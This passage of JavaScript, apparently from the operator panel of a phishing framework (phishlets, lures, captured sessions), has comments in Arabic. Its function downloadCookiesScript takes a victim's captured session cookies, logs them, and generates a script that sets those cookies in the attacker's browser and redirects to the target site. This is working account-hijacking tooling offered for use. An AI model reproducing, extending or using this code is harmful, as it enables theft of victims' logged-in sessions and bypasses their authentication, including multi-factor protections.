            
            // Special case for sessions tab - refresh data
            if (targetId === 'sessions-tab') {
                fetchSessions().then(populateSessionsTable);
            }
            // Special case for phishlets tab - refresh data
            else if (targetId === 'phishlets-tab') {
                fetchPhishlets().then(populatePhishletsTable);
            }
            // Special case for lures tab - refresh data
            else if (targetId === 'lures-tab') {
                fetchLures().then(populateLuresTable);
            }
        });
    });

    // مستمع لزر تنزيل الكوكيز
    document.getElementById('download-cookies-btn').addEventListener('click', function() {
        downloadCookiesScript();
    });
    
    // مستمعات الأحداث لعلامات تبويب نافذة تفاصيل الجلسة
    const tabItems = document.querySelectorAll('.tab-item');
    tabItems.forEach(item => {
        item.addEventListener('click', function() {
            // إزالة التنشيط من جميع علامات التبويب
            document.querySelectorAll('.tab-item').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // إضافة التنشيط للعلامة المحددة
            this.classList.add('active');
            
            // إخفاء جميع المحتويات
            document.querySelectorAll('.tab-pane').forEach(pane => {
                pane.classList.remove('active');
            });
            
            // إظهار المحتوى المرتبط بعلامة التبويب المحددة
            const targetTabId = this.getAttribute('data-tab');
            document.getElementById(targetTabId).classList.add('active');
        });
    });
    
    // إغلاق نافذة تفاصيل الجلسة
    document.querySelectorAll('.modal-cancel, .modal .close').forEach(btn => {
        btn.addEventListener('click', function() {
            document.getElementById('session-view-modal').style.display = 'none';
        });
    });
}

// Add download cookies script
function downloadCookiesScript() {
    const downloadBtn = document.getElementById('download-cookies-btn');
    const sessionId = downloadBtn.dataset.sessionId;
    
    if (!sessionId) {
        showToast('خطأ', 'لم يتم العثور على معرف الجلسة', 'error');
        return;
    }
    
    // الحصول على الكوكيز من الجدول
    const cookiesTable = document.getElementById('cookies-table');
    const rows = cookiesTable.querySelectorAll('tbody tr');
    
    // التحقق من وجود كوكيز
    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
        showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
        return;
    }
    
    // إنشاء صفيف للكوكيز
    const cookies = [];
    rows.forEach(row => {
        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
        if (row.cells.length === 1) return;
        
        cookies.push({
            domain: row.cells[0].textContent,
            name: row.cells[1].textContent,
            value: row.cells[2].textContent
        });
    });
    
    // ***** طباعة الكوكيز في سجلات المتصفح بشكل مفصل *****
    console.log('%c🍪 كوكيز الجلسة ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
    console.log('%c=================================', 'color:#3498db;');
    
    cookies.forEach((cookie, index) => {
        console.log(
            `%c[${index+1}] ${cookie.name}%c\nDomain: ${cookie.domain}\nValue: ${cookie.value}`, 
            'font-weight:bold; color:#2ecc71;', 
            'color:#95a5a6;'
        );
    });
    
    console.log('%c=================================', 'color:#3498db;');
    console.log('%cعدد الكوكيز: ' + cookies.length, 'font-weight:bold;');
    
    // إنشاء نص JavaScript لتعيين الكوكيز
    let jsCode = `// تنزيل الكوكيز للجلسة ${sessionId}\n`;
    jsCode += `// تاريخ التنزيل: ${new Date().toLocaleString()}\n\n`;
    jsCode += `!function(){\n`;
    jsCode += `    console.log("جاري إعداد الكوكيز...");\n\n`;
    
    // إضافة كل كوكي إلى النص
    cookies.forEach(cookie => {
        jsCode += `    // إعداد كوكي ${cookie.name}\n`;
        jsCode += `    document.cookie = "${cookie.name}=${cookie.value};`;
        if (cookie.domain) jsCode += `domain=${cookie.domain};`;
        jsCode += `path=/;Max-Age=31536000;Secure;SameSite=None";\n`;
        jsCode += `    console.log("تم إعداد الكوكي: ${cookie.name}");\n\n`;
    });
    
    jsCode += `    console.log("تم إعداد جميع الكوكيز بنجاح!");\n`;
    jsCode += `    alert("تم إعداد الكوكيز بنجاح! يمكنك الآن الانتقال للموقع المستهدف.");\n`;
    jsCode += `    // الانتقال إلى الموقع المستهدف\n`;
    if (cookies.length > 0 && cookies[0].domain) {
        jsCode += `    window.location.href = "https://${cookies[0].domain}";\n`;
    } else {
        jsCode += `    // window.location.href = "https://example.com";\n`;
    }
    jsCode += `}();`;
    
    // إنشاء ملف نصي
    const blob = new Blob([jsCode], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);
    
    // إنشاء رابط تنزيل
    const downloadLink = document.createElement('a');
    downloadLink.href = url;
    downloadLink.download = `cookies_${sessionId}_${Date.now()}.js`;
    
    // تنزيل الملف
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
    
    // إظهار رسالة نجاح
    showToast('نجاح', 'تم إنشاء سكريبت الكوكيز بنجاح وطباعته في سجلات المتصفح', 'success');
} 